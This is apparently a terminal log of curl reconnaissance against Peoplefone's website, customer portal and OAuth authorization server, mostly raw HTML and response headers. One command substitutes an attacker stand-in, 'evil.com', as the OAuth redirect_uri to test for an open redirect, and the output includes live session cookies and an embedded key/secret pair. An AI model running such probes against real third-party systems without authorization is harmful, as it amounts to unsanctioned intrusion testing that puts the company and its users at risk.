+        <div class="relative flex items-top justify-center min-h-screen bg-gray-100 dark:bg-gray-900 sm:items-center sm:pt-0" role="main">
+            <div class="max-w-xl mx-auto sm:px-6 lg:px-8">
+                <div class="flex items-center pt-8 sm:justify-start sm:pt-0">
+                    <h1 class="px-4 text-lg dark:text-gray-300 text-gray-700 border-r border-gray-400 tracking-wider">
+                        404                    </h1>
+
+                    <div class="ml-4 text-lg dark:text-gray-300 text-gray-700 uppercase tracking-wider">
+                        Not Found                    </div>
+                </div>
+            </div>
+        </div>
+    <script>window.__CF$cv$params={r:'a358302858dc0a7f',t:'MTc4ODQ3NDUxMg==',u:'01a0696356f972e299381450437e0dac',ut:'Hh_FwQAhijK1J4TEBk9OyBNDUW0loEDtVuSpR0l38xc-1788474513-1.2.1.1-5aeXOYHpWj8Y0_LBn9B76pY2HrtGP1BCKQQgTUSC6ZViGegP3LnyhcJy8RBS4j9fRMos2fz.KBwuomfSH.jtoRjLk_l3D6BMIXE96ayMcgg',i:60};(function(){if(!document.body)return;var s=document.createElement('script');s.src='/cdn-cgi/challenge-platform/scripts/precursor/main.js';document.head.appendChild(s);})();</script></body>
+</html>
+[0m
+[0m$ [0mcurl -s "https://www.peoplefone.com/en-ch/login" 2>&1 | head -100
+(no output)
+[0m
+[0m$ [0mcurl -s -I "https://www.peoplefone.com/en-ch/login" 2>&1 | head -20
+HTTP/1.1 307 Temporary Redirect
+Server: nginx
+Date: Thu, 03 Sep 2026 22:29:09 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: keep-alive
+X-Powered-By: PHP/8.3.33
+X-Redirect-By: TYPO3 Shortcut/Mountpoint
+X-TYPO3-Cache-Tags: 
+X-TYPO3-Cache-Lifetime: 9223372036854775807
+X-TYPO3-Parsetime: 0ms
+location: https://www.peoplefone.com/en-ch/customer?tx_news_pi1%5Baction%5D=detail&tx_news_pi1%5Bcontroller%5D=News&cHash=c67eeccbcc9c3c82edae85f62ce19128
+Cache-Control: max-age=0
+Expires: Thu, 03 Sep 2026 22:29:09 GMT
+X-UA-Compatible: IE=edge
+X-Content-Type-Options: nosniff
+X-Powered-By: PleskLin
+[0m
+[0m$ [0mcurl -s "https://www.peoplefone.com/en-ch/customer" 2>&1 | grep -i -E "(oauth|auth|login|redirect|client_id)" | head -20
+Login
+[0m
+[0m$ [0mcurl -s "https://www.peoplefone.com/en-ch/customer" 2>&1 | head -200
+<!DOCTYPE html>
+<html lang="en-CH">
+<head>
+    <meta charset="utf-8">
+
+<!-- 
+	——————————————————————————————————————————————————
+		RTP GmbH | https://www.rtp.ch/
+		TYPO3 and Neos Application Development and Hosting
+		——————————————————————————————————————————————————
+
+	This website is powered by TYPO3 - inspiring people to share!
+	TYPO3 is a free open source Content Management Framework initially created by Kasper Skaarhoj and licensed under GNU/GPL.
+	TYPO3 is copyright 1998-2026 of Kasper Skaarhoj. Extensions are copyright of their respective owners.
+	Information and contribution at https://typo3.org/
+-->
+
+
+<title>Customer: Schweiz | Peoplefone AG</title>
+<meta property="og:type" content="website">
+<meta property="og:title" content="Customer">
+<meta property="og:description" content="peoplefone is the Swiss provider of telephone and communication solutions. We have a solution for every size of company and every customer.">
+<meta property="og:url" content="https://www.peoplefone.com/en-ch/customer">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Customer">
+<meta name="twitter:description" content="peoplefone is the Swiss provider of telephone and communication solutions. We have a solution for every size of company and every customer.">
+<meta name="generator" content="TYPO3 CMS">
+<meta name="description" content="peoplefone is the Swiss provider of telephone and communication solutions. We have a solution for every size of company and every customer.">
+<meta name="robots" content="index,follow">
+<meta name="application-name" content="Peoplefone">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="apple-mobile-web-app-title" content="Peoplefone">
+<meta name="msapplication-tilecolor" content="#9b1c20">
+<meta name="msapplication-tileimage" content="/typo3conf/cd/favicons/mstile-144x144.png">
+<meta name="theme-color" content="#ffffff">
+<meta name="language" content="en-CH">
+<meta name="format-detection" content="telephone=no">
+<meta name="copyright" content="2026">
+
+
+<link rel="stylesheet" href="/typo3conf/cd/css/critical.min.css" media="all">
+<link rel="stylesheet" href="/_assets/d461d430ac6d491798edb1a70ad2c329/Css/Iconpack.min.css?1783505768" media="all">
+<link rel="stylesheet" href="/typo3conf/cd/css/custom.css?1771330461" media="all">
+<link rel="stylesheet" href="/js/vendors/swiper/swiper-bundle.min.css?1762248901" media="all">
+<link rel="stylesheet" href="/css/overrides.css?1782136929" media="all">
+<link rel="stylesheet" href="/_assets/9d1343e74b5f323053fb0f6af1895d1c/Css/TextIcon.css?1786022792" media="all">
+<link media="all" href="/_assets/d461d430ac6d491798edb1a70ad2c329/Css/IconpackTransforms.min.css?1783505768" rel="stylesheet" >
+
+
+<script src="/typo3conf/cd/js/critical.min.js?1730990459"></script>
+
+
+
+<link rel="icon" href="/typo3conf/cd/favicons/favicon.ico">
+<link rel="apple-touch-icon" sizes="180x180" href="/typo3conf/cd/favicons/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/typo3conf/cd/favicons/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/typo3conf/cd/favicons/favicon-16x16.png">
+<link rel="manifest" href="/typo3conf/cd/favicons/site.webmanifest">
+<link rel="mask-icon" href="/typo3conf/cd/favicons/safari-pinned-tab.svg" color="#9b1c20"><link rel="stylesheet" type="text/css" href="/typo3conf/cd/css/main.min.css" onload="this.setAttribute('media', 'all')" media="all"><link rel="prefetch" href="/typo3conf/cd/img/svg/svg.svg" /><link rel="prefetch" href="/typo3conf/cd/fonts/fira-sans-v15-latin-ext_latin-500.woff" />
+<link rel="prefetch" href="/typo3conf/cd/fonts/fira-sans-v15-latin-ext_latin-500.woff2" />
+<link rel="prefetch" href="/typo3conf/cd/fonts/fira-sans-v15-latin-ext_latin-600.woff" />
+<link rel="prefetch" href="/typo3conf/cd/fonts/fira-sans-v15-latin-ext_latin-600.woff2" />
+<link rel="prefetch" href="/typo3conf/cd/fonts/fira-sans-v15-latin-ext_latin-regular.woff" />
+<link rel="prefetch" href="/typo3conf/cd/fonts/fira-sans-v15-latin-ext_latin-regular.woff2" /><script data-cookieconsent="ignore">
+window.dataLayer = window.dataLayer || [];
+function gtag() {
+    dataLayer.push(arguments);
+}
+gtag("consent", "default", {
+    ad_storage: "denied",
+    analytics_storage: "denied",
+    functionality_storage: "denied",
+    personalization_storage: "denied",
+    security_storage: "granted",
+    wait_for_update: 2000,
+});
+gtag("set", "ads_data_redaction", true);
+gtag("set", "url_passthrough", false);
+</script><script data-cookieconsent="ignore">                            (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-W8C3C93');</script><script id="Cookiebot" src="https://consent.cookiebot.com/uc.js" data-cbid="5208c2db-6bb7-46e7-968b-a09ebbd7e03d" data-blockingmode="auto" type="text/javascript"></script><script>
+salessuckers_cid=164; salessuckers_did=1190;
+var salessuckers_d='https://wunderpus.azurewebsites.net/client.js';
+(function(d,t) { var s=d.createElement(t); var r=d.getElementsByTagName(t)[0];
+    s.src=salessuckers_d;
+    s.setAttribute('async', '');
+    r.parentNode.insertBefore(s,r)
+}(document,'script'));
+</script>
+<noscript><img src="https://wunderpus.azurewebsites.net/api/v1/client/tr_px/161/986" style="width:0px;height:0px;" alt="" /></noscript><script id="CookieDeclaration" src=https://consent.cookiebot.com/5208c2db-6bb7-46e7-968b-a09ebbd7e03d/cd.js type="text/javascript" async></script>
+<link rel="canonical" href="https://www.peoplefone.com/en-ch/customer">
+
+<link rel="alternate" hreflang="de-CH" href="https://www.peoplefone.com/de-ch/kunden">
+<link rel="alternate" hreflang="fr-CH" href="https://www.peoplefone.com/fr-ch/clients">
+<link rel="alternate" hreflang="it-CH" href="https://www.peoplefone.com/it-ch/clienti">
+<link rel="alternate" hreflang="en-CH" href="https://www.peoplefone.com/en-ch/customer">
+<link rel="alternate" hreflang="x-default" href="https://www.peoplefone.com/de-ch/kunden">
+<!-- This site is optimized with the Yoast SEO for TYPO3 plugin - https://yoast.com/typo3-extensions-seo/ -->
+<script type="application/ld+json">[{"@context":"https:\/\/www.schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/www.peoplefone.com\/en-ch\/","name":"Switzerland"}},{"@type":"ListItem","position":2,"item":{"@id":"https:\/\/www.peoplefone.com\/en-ch\/customer","name":"Customer"}}]}]</script>
+</head>
+<body class="pagetype--customer">
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-W8C3C93" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+
+    <header class="show-until-desktop-large page-header--container">
+        <div class="page-header--container-inner">
+            <div class="page-header--logo">
+                <a href="/en-ch/customer" title="Peoplefone">
+                    
+                            <svg class="page-header--logo-icon" aria-hidden="true" focusable="false">
+                                <use href="/typo3conf/cd/img/svg/svg.svg#Logo"></use>
+                            </svg>
+                        
+                    <span class="sr-only">Peoplefone</span>
+                </a>
+            </div>
+            <div class="hamburger--container">
+                <div class="hamburger">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <header class="show-from-desktop-large page-header--container">
+        <div class="width-xxl page-header--container-inner">
+            <div class="page-header--logo">
+                <a href="/en-ch/customer" title="Peoplefone">
+                    
+                            <svg class="page-header--logo-icon" aria-hidden="true" focusable="false">
+                                <use href="/typo3conf/cd/img/svg/svg.svg#Logo"></use>
+                            </svg>
+                        
+                    <span class="sr-only">Peoplefone</span>
+                </a>
+            </div>
+
+            
+    
+        <div class="page-header--section-links">
+            
+                <a class="cta-light cta-light--active" href="/en-ch/customer">
+                    Customer
+                </a>
+            
+                <a class="cta-light" href="/en-ch/partner">
+                    Partner
+                </a>
+            
+                <a class="cta-light" href="/en-ch/developer">
+                    Developer
+                </a>
+            
+        </div>
+    
+
+
+            <div class="page-header--meta">
+                
+    
+    
+    
+    
+        <a href="/en-ch/customer/system-status">
+        <span class="page-header--systemstatus--label">
+            System Status
+        </span>
+            <span data-container="status"
+                  data-key="yAsaR3lDVY3du4jHXoRp8IOQb2VNhlv5OLQZpljF"
+                  data-secret="VAFNm1A4LJ0uqVIBubQul6pWJvNUtYIDpZpFSGd2"
+                  data-locale="de_CH"
+            ></span>
+        </a>
+    
+
+    
+        
+            
+                    <a href="/en-ch/customer/about-us/team-contact/contact-peoplefone">
+                        Contact
+                    </a>
+                
+        
+            
+                    <a target="_blank" href="https://portal.peoplefone.ch/" rel="noreferrer">
+                        Login
+                    </a>
+                
+        
+            
+                    <a title="Search" href="/en-ch/customer/search">
+                        <svg class="page-header--icon" aria-hidden="true"
+                             focusable="false">
+                            <use href="/typo3conf/cd/img/svg/svg.svg#Icon-search"></use>
+                        </svg>
+                        <span class="sr-only">Search</span>
+                    </a>
+[0m
+[0m$ [0mcurl -s -I "https://portal.peoplefone.ch/" 2>&1 | head -30
+HTTP/1.1 302 Found
+Date: Thu, 03 Sep 2026 22:29:53 GMT
+Content-Type: text/html; charset=utf-8
+Connection: keep-alive
+Cache-Control: no-cache, private
+Location: https://portal.peoplefone.ch/home
+Set-Cookie: XSRF-TOKEN=eyJpdiI6IkM2SGZBT3p4VFc4OHd3R3J6c3FWdHc9PSIsInZhbHVlIjoibWtTVGF2WVlKR3FSaU54bzlwaUl4L3A3bEJyVFJsQ0gyb2FmaktTYUt1c21vcE5CNVpUTDhLVzJaK2pMb2Rjc2tYSnZCRStES0VFY0ZqckRpNytWM0J2UzlyNHArZ3NmenpiKy9xbzNtOHZ1T3dmT25YQWY5ZUpDeHcwT2FKZFIiLCJtYWMiOiI0M2VhNGNjZjk4NjMxMjRjNDkzYWI5ZTA1Njk3YmM2NGVmZjgxYmZkZTFjOGIwMWJmNDc2MWVhOGM4ZTFhMzQwIiwidGFnIjoiIn0%3D; expires=Fri, 04 Sep 2026 04:29:53 GMT; Max-Age=21600; path=/; secure; samesite=none
+Set-Cookie: peoplefone_che_portal_session=eyJpdiI6ImZ0dVVESG1DcjYzVFkwN0NKM3BSV2c9PSIsInZhbHVlIjoiMzliSW9kUVVVUTA2WjNZcEVnc1NqNXgvNElYTlUxQldJeHhXTzcwTmZBSHpJMXd0cWkvYXpkLzNtbkNWQ3BVTEZjc3ZzTjRNRlBnMUd6Q1NucS8wcGhtU201OEpyc1dxVTRsNUpXSExSeklWQWhZd0t5SWxLSElOZGRFKytUUGgiLCJtYWMiOiJlNmMyODg3YzYzOTA1NjkyYjFlN2MxMjk5ZTc3ODYzYTUzM2E3NTFiMzQyMmRhNWQyNWEwNjJhYTEwYTQ5Y2Q2IiwidGFnIjoiIn0%3D; expires=Fri, 04 Sep 2026 04:29:53 GMT; Max-Age=21600; path=/; secure; httponly; samesite=none
+Set-Cookie: locale=de_CH; expires=Fri, 08 Oct 2027 22:29:53 GMT; Max-Age=34560000; path=/; secure; samesite=none
+cf-cache-status: DYNAMIC
+Server: cloudflare
+CF-RAY: a358321c4ec98027-IAD
+[0m
+[0m$ [0mcurl -s "https://portal.peoplefone.ch/home" 2>&1 | grep -i -E "(oauth|auth|login|redirect|client_id|authorize)" | head -30
+<meta http-equiv="refresh" content="0;url='https://portal.peoplefone.ch/login'" />
+        <title>Redirecting to https://portal.peoplefone.ch/login</title>
+        Redirecting to <a href="https://portal.peoplefone.ch/login">https://portal.peoplefone.ch/login</a>.
+[0m
+[0m$ [0mcurl -s "https://portal.peoplefone.ch/login" 2>&1 | head -200
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="UTF-8" />
+        <meta http-equiv="refresh" content="0;url='https://auth.peoplefone.com/oauth/authorize?client_id=1&amp;redirect_uri=https%3A%2F%2Fportal.peoplefone.ch%2Fauthback&amp;response_type=code&amp;scope=&amp;locale=de_CH&amp;state=bG9yH1bsQJTEjasnyV76gnrQ7cAHhr2RJDxemJip'" />
+
+        <title>Redirecting to https://auth.peoplefone.com/oauth/authorize?client_id=1&amp;redirect_uri=https%3A%2F%2Fportal.peoplefone.ch%2Fauthback&amp;response_type=code&amp;scope=&amp;locale=de_CH&amp;state=bG9yH1bsQJTEjasnyV76gnrQ7cAHhr2RJDxemJip</title>
+    </head>
+    <body>
+        Redirecting to <a href="https://auth.peoplefone.com/oauth/authorize?client_id=1&amp;redirect_uri=https%3A%2F%2Fportal.peoplefone.ch%2Fauthback&amp;response_type=code&amp;scope=&amp;locale=de_CH&amp;state=bG9yH1bsQJTEjasnyV76gnrQ7cAHhr2RJDxemJip">https://auth.peoplefone.com/oauth/authorize?client_id=1&amp;redirect_uri=https%3A%2F%2Fportal.peoplefone.ch%2Fauthback&amp;response_type=code&amp;scope=&amp;locale=de_CH&amp;state=bG9yH1bsQJTEjasnyV76gnrQ7cAHhr2RJDxemJip</a>.
+    </body>
+</html>
+[0m
+[0m$ [0mcurl -s -I "https://auth.peoplefone.com/oauth/authorize?client_id=1&redirect_uri=https://evil.com&response_type=code&scope=openid&state=test" 2>&1 | head -30
+HTTP/1.1 404 Not Found
+Date: Thu, 03 Sep 2026 22:30:55 GMT
+Content-Type: text/html; charset=utf-8
+Connection: keep-alive
+Cache-Control: no-cache, private
+Set-Cookie: XSRF-TOKEN=eyJpdiI6ImJtVDFZY2ZwU2luRGRocnpPbitkVUE9PSIsInZhbHVlIjoiWWxWNFFFSklGU2dzYWEvNEludkhrYzdEQytITnJNRDBWZnQyMHZiSlhIMzliN1U2TzJhVURFOE5NVEY5SzNtcXR2cHBRWUhuWTh1cEUycVhGSFNMZEdJY05TT3FiVEFRUkg2TlhKRVFiT0FNZGNIRmlsQnNleGF2Y1F2dnBzNTAiLCJtYWMiOiI3YjJhMzZkYjJkNzg5M2EyZjEzZDBmZTBmZWEyMmYxMTFjYjFmOWM0OGJhYWEzYzI3YTI5NDc3Y2U0MGQzMGUzIiwidGFnIjoiIn0%3D; expires=Fri, 04 Sep 2026 06:30:55 GMT; Max-Age=28800; path=/; secure; samesite=lax
+Set-Cookie: peopoauth_session=eyJpdiI6IndmblYwendKOG9WUVNoOEtMK2pWSXc9PSIsInZhbHVlIjoiaUREaEovUVB5Z1RRT1lsSWdKdWJRN3FPUW5nVm95Nk52QVJ0ZHU2dHYrWW5IeDFlL0EzMW9oTGplQ0tFUlBhWUVPaXF5Q3FSLzdRTlpySmJKOWdKbzFwQWhJQ0JWUHBOUjVwZlVUM1JiN0Q3aG5MQnpOQ3V6TnVxYk5zM0lqa0QiLCJtYWMiOiJlODM0MGZkZDM4ZGY1YTJlYTkwYmVmMzczMTg4NDYwMTE2NjhkNDAyMWVlZTYzNjg0OWI2YWQ4M2Q2MDU5ZmI1IiwidGFnIjoiIn0%3D; expires=Fri, 04 Sep 2026 06:30:55 GMT; Max-Age=28800; path=/; secure; httponly; samesite=lax
+Set-Cookie: redirect_uri=eyJpdiI6InhxMU5XM05ZV2EwY2pNMjg4OFhIeHc9PSIsInZhbHVlIjoiMWhnZ1JQOEVwYVpFcjJZU3I0S3JqK1NHV1hRMGJxNkwrckpDeVAxbUVYSHlvK2dHSkxVcVdEejFCU3JmYmdGL2R4cUduRjZzWVVUckh3MUM5R3BlckE9PSIsIm1hYyI6IjNmYTc5N2M2YzRjOWU5YWY0NGM1YjllMmRkYWUzNWEzYWZmOTRmZjhiNDRhNzZmY2VlN2VmZDY4ZjdlMjE2NmMiLCJ0YWciOiIifQ%3D%3D; expires=Fri, 08 Oct 2027 22:30:55 GMT; Max-Age=34560000; path=/; secure; httponly; samesite=lax
+cf-cache-status: DYNAMIC
+expect-ct: max-age=86400, enforce
+referrer-policy: same-origin
+x-content-type-options: nosniff
+x-frame-options: SAMEORIGIN
+x-xss-protection: 1; mode=block
+Server: cloudflare
+CF-RAY: a35833a358c8840d-IAD
+[0m
+[0m$ [0mcurl -s -I "https://auth.peoplefone.com/oauth/authorize?client_id=1&redirect_uri=https%3A%2F%2Fportal.peoplefone.ch%2Fauthback&response_type=code&scope=openid&state=test" 2>&1 | head -30
+HTTP/1.1 404 Not Found
+Date: Thu, 03 Sep 2026 22:31:10 GMT
+Content-Type: text/html; charset=utf-8
+Connection: keep-alive
+Cache-Control: no-cache, private
+Set-Cookie: XSRF-TOKEN=eyJpdiI6IjJhcjNRS2VmSHl3WmNNVkQwZ1lad1E9PSIsInZhbHVlIjoidGVKa1IyakhiSTUrSFBHOFFKT2NFZXVZSVVJdnZvajRNVkpNek9PN2VxMHJpLzdvM3NCbWhKb2JQVFMyeDJHeDJ4bHFBN3JSYVRUeXRUVGNqSyt4WGs1aUVZdHVZVkhUbEQ5RTJhUGl0bGNJRHNXVlBFSE9paEJMNWZDQ2VnUHUiLCJtYWMiOiJlOWY0M2VhMDI1OWJlMzUyMDkzYjI4ZjJlYzk0MTkxOTY4Njc5MTQ3OTdhZWIwOGYxMDkxY2I1YzM1OTg5OWUwIiwidGFnIjoiIn0%3D; expires=Fri, 04 Sep 2026 06:31:10 GMT; Max-Age=28800; path=/; secure; samesite=lax
+Set-Cookie: peopoauth_session=eyJpdiI6ImlNcmxpMkJxc1owMk5jNVIrc1lMTlE9PSIsInZhbHVlIjoiTjhDZmZ2VFJvTS90K2ZRWFN5dTZaTHFFbi9VaWNzeEFWVmFocUZKUGVqK1hHMlpxMGdDMytPMEVyaVhxdTlCRVZNZW14cWJUM253MDNtV2N2d0FPVWxxMW84ZXN3RWhvQWFsVThHQkZ1aHpWZDZJd2pQRHl0MTYzRUZvUzNaQmIiLCJtYWMiOiI4YzllZmI3MTA4ZWZmZDRhOGIxZjBhMzcwNDIxNzc2ZGZiM2RmZDA2MTU3OWU3YmYwMzY0MTcxOTk0ZDdiNmZkIiwidGFnIjoiIn0%3D; expires=Fri, 04 Sep 2026 06:31:10 GMT; Max-Age=28800; path=/; secure; httponly; samesite=lax
+Set-Cookie: redirect_uri=eyJpdiI6InFjUzhKYjdNWEczNGp6SlRaNE00SVE9PSIsInZhbHVlIjoiWURuT05wdlptQkZOK1ljYlQrNno1V3F0YStqV0dxd2pTMklQMWZBcWJTS2xKRlQwZTNpcFg3M0RUUURuK1VzVjNzemZnZ3BrMmpUZTZUR1QyT003ZndYajgycU50cjMwQUVWZGVQcGF1d2c9IiwibWFjIjoiOWRlYjE3OTIwYWNiOWYxZWZlYzI5ZmY5NzMwOGE4YjliM2QxYzhmZmQ3MzU3ZjJkNGViNmY0ZjdlZGUwNzc3YiIsInRhZyI6IiJ9; expires=Fri, 08 Oct 2027 22:31:10 GMT; Max-Age=34560000; path=/; secure; httponly; samesite=lax
+cf-cache-status: DYNAMIC
+expect-ct: max-age=86400, enforce
+referrer-policy: same-origin
+x-content-type-options: nosniff
+x-frame-options: SAMEORIGIN
+x-xss-protection: 1; mode=block
+Server: cloudflare
+CF-RAY: a358340339f3840d-IAD
+[0m
+[0m$ [0mcurl -s -L "https://portal.peoplefone.ch/login" 2>&1 | head -100
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Peoplefone</title>
+    <!-- Google Tag Manager -->
+    <script data-cookieconsent='ignore'>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});
+                        var f=d.getElementsByTagName(s)[0],
+                            j=d.createElement(s),
+                            dl=l!='dataLayer'?'&l='+l:'';
+                        j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+                        })(window,document,'script','dataLayer','GTM-W8C3C93');
+                     </script>
+    <!-- End Google Tag Manager -->
+    
+    <link href="/css/app.css?id=7369f0a4c1f7c3d43b18" rel="stylesheet">
+    <style>
+    body {
+        background-color: #f5f7fa;
+    }
+
+    p, span {
+        color: #000000;
+    }
+
+    .container {
+        margin-top: 20px;
+    }
+
+    .wrapper {
+        margin-left: auto;
+        margin-right: auto;
+        max-width: 360px;
+        min-width: 200px;
+    }
+
+    .wrapper-login {
+        margin-left: auto;
+        margin-right: auto;
+        /*max-width: 350px;*/
+        /*min-width: 200px;*/
+    }
+
+    .wrapper-verify {
+        margin-left: auto;
+        margin-right: auto;
+        max-width: 500px;
+    }
+
+    .wrapper-dashboard {
+        margin-left: auto;
+        margin-right: auto;
+        max-width: 700px;
+        min-width: 250px;
+    }
+
+    .login-box {
+        width: 100%;
+        padding: 20px 20px;
+        background-color: white;
+        border-radius: 3px;
+
+        -webkit-box-shadow: 0px 0px 4px -1px rgba(0, 0, 0, 0.6);
+        -moz-box-shadow: 0px 0px 4px -1px rgba(0, 0, 0, 0.6);
+        box-shadow: 0px 0px 4px -1px rgba(0, 0, 0, 0.6);
+    }
+
+    img {
+        max-width: 150px;
+        max-height: 150px;
+        object-fit: contain;
+    }
+
+    .box-header {
+        margin-bottom: 40px;
+        color: #000000;
+        border-bottom: solid 1px #ced4da;
+    }
+
+    .box-header-login {
+        color: #000000;
+        height: 10px;
+        margin-bottom: 20px;
+    }
+
+    .card-header {
+        padding-bottom: 1px !important;
+        background-color: #9d0014 !important;
+    }
+
+    .logo {
+        width: 100%;
+        margin: 0px auto 0px auto;
+        text-align: center;
+        padding: 10px 0;
+        overflow: hidden;
+    }
+[0m
+[0m$ [0mcurl -s -I "https://auth.peoplefone.com/oauth/authorize?client_id=1&redirect_uri=https%3A%2F%2Fportal.peoplefone.ch%2Fauthback&response_type=code&scope=openid&state=validstate123" 2>&1 | head -30
+HTTP/1.1 404 Not Found
+Date: Thu, 03 Sep 2026 22:31:38 GMT
+Content-Type: text/html; charset=utf-8
+Connection: keep-alive
+Cache-Control: no-cache, private
+Set-Cookie: XSRF-TOKEN=eyJpdiI6IlpPLzM4aG43ZThZODdqaTNZWC8wTHc9PSIsInZhbHVlIjoiZ3NDQU5lYzJ2YzBRamFjRHR0eGp2cUZYVlEyYUh0bWZ4bzAybWtKcFRudHlhVEdlUFFsUjZudHAxVXdEblZwTFdIRTd1SFI2dEF3WTE3UE1YMCs0eThUczBaRlZ3OTJqNzZWaU5JelhUMmNrSmRCTVd4QlhXZTJadWxkSHpMSzMiLCJtYWMiOiJhOWE4YTExYzI1NTc3MjZjMDc2MmRlZWY2MjJlNjM3ZWFlNmU3MjhmZTQwMDU5ZTc0NTczNTAyNmIxZDZiMDZhIiwidGFnIjoiIn0%3D; expires=Fri, 04 Sep 2026 06:31:38 GMT; Max-Age=28800; path=/; secure; samesite=lax
+Set-Cookie: peopoauth_session=eyJpdiI6Ik1XaE1zNHB5bDlFNllaMDcwL0ZyUnc9PSIsInZhbHVlIjoidERUT21GMlg5QmY4YTRNdC9QdjhYbjQyek5oOGtCbEFaOVJGSlZoK29YcFVxMmhZbWNZUDEySmxmRllLandNT3hBM1U2eCt5L2hsaWRueGE1MGROYWZTZThqMGVNRUVBSnBGQitQZWpIbmR5SytGR2hNM0JQK2ZaYlZrMkVUWVoiLCJtYWMiOiJhNTlmOTAzOTFiOGU3ODgxMTg0OGRmYTgxMTc0NDczZDg5NWFlZjUwOGEyZDcxZjJhYWYxZGVkZjRkNjkwYzM1IiwidGFnIjoiIn0%3D; expires=Fri, 04 Sep 2026 06:31:38 GMT; Max-Age=28800; path=/; secure; httponly; samesite=lax
+Set-Cookie: redirect_uri=eyJpdiI6IkdGMkU3ZnlHOXZlanlOZ2lablRITmc9PSIsInZhbHVlIjoieGR0SkY1K2VrZUpvRWtWOU1uQ0hIMHpEVGpBSkI1a3RJYzNkYmplQ041Tm1aNVNQWG5XMnhHK0lmN0h3TUphMjJ1U25YeGZZa2RwbEIrL3VhN0puTHNaVUdhWVZDbzIyV251aVRlbU9WRjA9IiwibWFjIjoiN2VkNDUxZWZjNDJmNGZiMmM2Yjc5MDc1M2E4N2E3MzBjMzQ4ZDI0MDViNjUxNGE4NGU4NWZkYzA5NzdiZTFlYiIsInRhZyI6IiJ9; expires=Fri, 08 Oct 2027 22:31:38 GMT; Max-Age=34560000; path=/; secure; httponly; samesite=lax
+cf-cache-status: DYNAMIC
+expect-ct: max-age=86400, enforce
+referrer-policy: same-origin
+x-content-type-options: nosniff
+x-frame-options: SAMEORIGIN
+x-xss-protection: 1; mode=block
+Server: cloudflare
+CF-RAY: a35834b32957840d-IAD
+[0m
+[0m$ [0mcurl -s -I -H "Referer: https://portal.peoplefone.ch/" "https://auth.peoplefone.com/oauth/authorize?client_id=1&redirect_uri=https%3A%2F%2Fportal.peoplefone.ch%2Fauthback&response_type=code&scope=openid&state=validstate123" 2>&1 | head -30
+HTTP/1.1 404 Not Found
+Date: Thu, 03 Sep 2026 22:31:51 GMT
+Content-Type: text/html; charset=utf-8
+Connection: keep-alive
+Cache-Control: no-cache, private
+Set-Cookie: XSRF-TOKEN=eyJpdiI6InFLcGliNExycG52b1FFTFZZK2c2Y3c9PSIsInZhbHVlIjoiQjQ4NlRYVllIcFVyUGZnYkJTZmdYSkRnQkpyNE1FdTdqQm1nOCtUS3BWWDN2ei82aGZBMVlUT2ErLzI4ZXVUTXE1MHgyQVVJVTc4RUdkb0ZVa2dWeXIzcXVkWjdBcmJ1ZzhyaWhTdlZHY2pjNzdXVEpoYWpqdENSQ3U0UFIyblAiLCJtYWMiOiI0OGM4NGY4YjA0M2VmNzExNWRiMDI3YWJkNGEwMjM5Y2ViOTVjOWJjYTY5YTEzOWY5ZDhlYmY0Zjc3MWYwOWQ2IiwidGFnIjoiIn0%3D; expires=Fri, 04 Sep 2026 06:31:51 GMT; Max-Age=28800; path=/; secure; samesite=lax
+Set-Cookie: peopoauth_session=eyJpdiI6IlRJZ3RBWko3clhSdXQvclJlNUZQQUE9PSIsInZhbHVlIjoiV0N1N3J4OERXTnVyNU1FMEFDQW5PVlpid2JzS1VGdTN3RlJGWDg0UkZxSjFzcFpqWC9xSStoMWtCV2tKSmp2MGxiZENJeUxJSWN2UmlFWEtKZXIyZlpwMVBqQWw3MHRMdmRIeXk0bkhoUmJaSitkNFladjdFTGxtT0ZxR0t6MUQiLCJtYWMiOiI4ZjdiNzBlZWNiMTQ0NWI4YmZkMjAzODNjOTQ2Mjc5Y2UxMTIyMTdkZmFhMDk5MmYyOGJhZWNiYzRhYzc3YTA3IiwidGFnIjoiIn0%3D; expires=Fri, 04 Sep 2026 06:31:51 GMT; Max-Age=28800; path=/; secure; httponly; samesite=lax
+Set-Cookie: redirect_uri=eyJpdiI6IkNpNE5Ec1VCczVqT3JFTXZiVWRoUWc9PSIsInZhbHVlIjoiWERpaktYNW4zNFFQL0xrMXRlcnc0cWJtUWI5U1dvL3RYMm1ZZWtuWE1uVW1uK2hKR1N0dVJwaEg1d2xRT1JpRnVpS1h1ZWNITGRRVXpNWnVyWStRZFB4eThROUV6QXFicnlHOC9rZVI1Q0E9IiwibWFjIjoiYmM4ZDY1MDliOTI0Yzc4NTMzZDNmNzNmZmM5OWRiZGIxY2RiZThhOWE2NTY3MDc4ZjMxODc0YzNmZTA0NGIzYSIsInRhZyI6IiJ9; expires=Fri, 08 Oct 2027 22:31:51 GMT; Max-Age=34560000; path=/; secure; httponly; samesite=lax
+cf-cache-status: DYNAMIC
+expect-ct: max-age=86400, enforce
+referrer-policy: same-origin
+x-content-type-options: nosniff
+x-frame-options: SAMEORIGIN
+x-xss-protection: 1; mode=block
+Server: cloudflare
+CF-RAY: a3583504beba840d-IAD
+[0m
+[0m$ [0mcurl -s -c /tmp/cookies.txt "https://portal.peoplefone.ch/login" 2>&1 | head -5
+<!DOCTYPE html>
